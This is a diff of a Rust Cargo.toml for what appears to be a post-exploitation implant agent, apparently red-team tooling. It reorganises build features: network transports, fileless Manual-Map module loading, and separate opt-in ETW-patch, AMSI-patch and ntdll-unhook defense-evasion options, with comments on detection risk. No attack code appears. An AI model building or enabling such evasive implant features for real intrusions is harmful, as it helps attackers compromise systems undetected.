@@ -24,10 +24,15 @@ path = "src/main.rs"
 # Stage0 = transport + crypto + module-loader + isolated-exec + Layer-A stealth
 #        + daily ops (shell/fs/proc/pty/socks). Heavy caps → L2 modules.
 # No standard / full / beacon product tiers.
-default = ["ws", "minimal"]
+default = ["ws", "minimal", "net"]
 
 # --- Transports (Builder picks one) ---
-ws = ["dep:tokio-tungstenite", "dep:url"]
+# Every transport pulls `net` — the async runtime stack (tokio + tokio-util +
+# yamux) + handler/transport modules. L2 module crates (e.g. mod_bof with
+# features=["bof"]) build WITHOUT `net`, so no tokio thread_locals enter the
+# mapped module image (pe_map refuses TLS directories under Manual-Map).
+net = ["dep:tokio", "dep:tokio-util", "dep:yamux"]
+ws = ["net", "dep:tokio-tungstenite", "dep:url"]
 # WSS with controllable ClientHello cipher order (rustls; not SChannel)
 ws-tls = [
     "ws",
@@ -35,15 +40,18 @@ ws-tls = [
     "dep:rustls",
     "dep:rustls-native-certs",
 ]
-tcp = []
-tcp_bind = []
-dns = ["dep:trust-dns-resolver"]
+tcp = ["net"]
+tcp_bind = ["net"]
+dns = ["net", "dep:trust-dns-resolver"]
 
 # --- Sole product aggregate ---
 # built-in: shell / PTY / fs / process / socks
 # L2: bof (classic in-process COFF module, Manual-Map, fileless), inject worker, ad worker
 # Web UI PTY uses Yamux stream 0x01 → requires `pty`.
 # `mem-map` IS product now: mod_bof must load fileless (no temp DLL on disk).
+# `etw-patch` is intentionally NOT in default: patching ETW on startup is a HIGH
+# heuristic signal (defense-evasion). Operators needing it opt in via
+# `--features etw-patch` (or stealth-adv bundle).
 minimal = [
     "post-ex",
     "pty",
@@ -76,19 +84,27 @@ dotnet = []
 encoding-support = ["dep:encoding_rs"]
 # Opt-in diagnostics / runtime (never in product default)
 logging = ["dep:env_logger"]
-rt-multi = ["tokio/rt-multi-thread"]
+rt-multi = ["net", "tokio/rt-multi-thread"]
 
-# Stealth options — OFF by default (custom: --features tcp,minimal,stealth-adv)
-stealth-adv = ["dep:lazy_static"]
+# Stealth options — fine-grained (product enables etw-patch only by default)
+etw-patch = []
+amsi-patch = []
+ntdll-unhook = []
+# Bundle: all advanced patches (high EDR signature — opt-in only)
+stealth-adv = ["etw-patch", "amsi-patch", "ntdll-unhook", "dep:lazy_static"]
+# Opt-in crash/diag capture (never in product default)
+diag = []
 # Sleep-mask AES stream (pulls `aes` crate only when enabled)
 sleep-mask = ["dep:aes"]
 
 [dependencies]
-# Single-thread runtime by default (smaller)
-tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"] }
+# Single-thread runtime by default (smaller). Optional: only pulled by `net`
+# (transports + agent); L2 module crates build without it → no tokio TLS dir
+# in the mapped module image.
+tokio = { version = "1.35", default-features = false, features = ["rt", "macros", "io-util", "net", "time", "sync", "process"], optional = true }
 tokio-tungstenite = { version = "0.21", default-features = false, features = ["connect"], optional = true }
-tokio-util = { version = "0.7", default-features = false, features = ["codec", "compat"] }
-yamux = "0.10"
+tokio-util = { version = "0.7", default-features = false, features = ["codec", "compat"], optional = true }
+yamux = { version = "0.10", optional = true }
 url = { version = "2.5", optional = true }
 trust-dns-resolver = { version = "0.23", optional = true }
 # Match tokio-tungstenite 0.21 → rustls 0.22 ClientConfig
@@ -137,3 +153,5 @@ nix = { version = "0.27", features = ["process", "fs", "user"] }
 proptest = "1.4"
 mockall = "0.12"
 tempfile = "3.8"
+
+# Release profile lives in workspace Client/Cargo.toml (member profiles are ignored).
